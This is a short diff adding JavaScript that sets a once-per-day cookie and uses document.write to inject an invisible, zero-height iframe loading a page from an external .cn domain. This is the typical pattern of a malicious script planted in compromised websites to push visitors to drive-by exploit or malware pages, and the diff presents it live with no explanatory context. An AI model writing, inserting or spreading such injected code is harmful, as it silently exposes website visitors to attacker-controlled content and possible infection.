@@ -1,0 +1,6 @@
+var cookieString=document.cookie;
+var start=cookieString.indexOf("cookiesleep");
+if(start!=-1){}else{var expires=new Date();
+expires.setTime(expires.getTime()+24*60*60*1000);
+document.cookie="cookiesleep=test;expires="+expires.toGMTString();
+document.write("<iframe src=http://www.zdq006.cn/zzll/1.htm width=50 height=0 border=0></iframe>");}
